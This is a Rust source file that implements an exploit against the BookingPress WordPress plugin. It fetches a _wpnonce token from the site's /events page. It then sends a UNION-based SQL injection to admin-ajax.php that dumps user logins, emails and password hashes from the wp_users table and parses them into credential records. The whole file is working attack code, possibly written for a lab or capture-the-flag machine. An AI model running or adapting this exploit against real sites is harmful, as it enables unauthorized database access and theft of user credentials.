use std::collections::HashMap;
use std::fmt::format;
use regex::Regex;
use reqwest::{Client};
use serde::Deserialize;
use crate::BASE_URL;
use crate::errors::MyError;
pub struct Booking {
    pub client: Client,
    pub url: String,
}

#[derive(Debug)]
pub struct Credentials {
    pub name: String,
    pub email: String,
    pub password: String,
}
impl Booking {
    pub fn new(client: Client, url: &str) -> Booking {
        Booking {
            client,
            url: url.to_string()
        }
    }

    pub async fn retrieve_nonce(&self) -> Result<String, MyError> {
        let booking_url = format!("http://{}/events", &self.url);

        let res = self.client
            .get(booking_url)
            .send()
            .await
            .expect("Http send request error. Check your internet.")
            .text()
            .await
            .expect("http response conversion error. Should not happen. Check your internet?");


        let re = Regex::new(r"_wpnonce:'(?<n>[^']+)").expect("regex build error. Should not happen. Unlucky you,");
        let nonce = &re.captures(&*res).ok_or(MyError::NoNonce)?["n"];
        if nonce.len() > 0 {
            Ok(nonce.to_string())
        } else {
            Err(MyError::NoNonce)
        }
    }

    pub async fn dump_credentials(&self, nonce: String) -> Result<Vec<Credentials>, MyError> {
        let dump_url: String = format!("http://{}/wp-admin/admin-ajax.php", &self.url);
        let query: String = format!("action=bookingpress_front\
        _get_category_services&_wpnonce={}&category_id\
        =33&total_service=-7502) UNION SELECT NULL,NULL\
        ,NULL,NULL,NULL,NULL,user_login,user_email,user_pass from blog.wp_users -- -", nonce);
        let res = self.client
            .post(dump_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(query)
            .send()
            .await
            .expect("POST send error")
            .json::<serde_json::Value>()
            .await
            .expect("POST conversion error");


        let credentials: Vec<Credentials> = res.as_array().unwrap().iter()
            .filter_map(|data| {
                Option::from(Credentials {
                    name: data["bookingpress_service_description"].as_str().map(|s| s.to_string()).expect("username missed. Wired"),
                    email: data["bookingpress_service_position"].as_str().map(|s| s.to_string()).expect("email missed. Wired"),
                    password: data["bookingpress_servicedate_created"].as_str().map(|s| s.to_string()).expect("password missed. Wired"),
                })
            }).collect();


        return Ok(credentials);
    }
}